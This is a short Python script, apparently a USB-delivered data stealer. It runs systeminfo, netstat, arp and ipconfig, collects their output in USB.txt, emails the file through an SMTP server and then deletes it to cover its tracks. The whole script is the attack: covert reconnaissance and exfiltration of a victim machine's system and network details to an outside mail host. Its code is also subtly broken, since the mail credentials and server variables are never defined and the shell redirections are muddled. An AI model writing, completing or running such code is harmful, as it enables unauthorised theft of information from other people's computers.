import os
import smtplib
import requests

url = "https://www.google.com"
try:
    url = requests.get(url)

    if url.status_code != 200:
        exit()

except Exception:
    exit()

file = "USB.txt"


def cmd(str):
    os.system(str)


def mailer(file , email , password , port , smtp):
    with open(file, "r") as f:
        read = f.read()

    server = smtplib.SMTP(smtp, int(port))
    server.ehlo()
    server.starttls()
    server.login(email, password)
    server.sendmail(email , email , read)


cmd("systeminfo > /dev/null >> USB.txt")
cmd("netstat -n > /dev/null >> USB.txt")
cmd("netstat -a > /dev/null >> USB.txt")
cmd("netstat -r > /dev/null >> USB.txt")
cmd("netstat -s > /dev/null >> USB.txt")
cmd("arp -a > /dev/null >> USB.txt")
cmd("ipconfig > /dev/null >> USB.txt")


mailer(file , email=email , password=password , smtp=smtp , port=port)
os.remove("USB.txt")
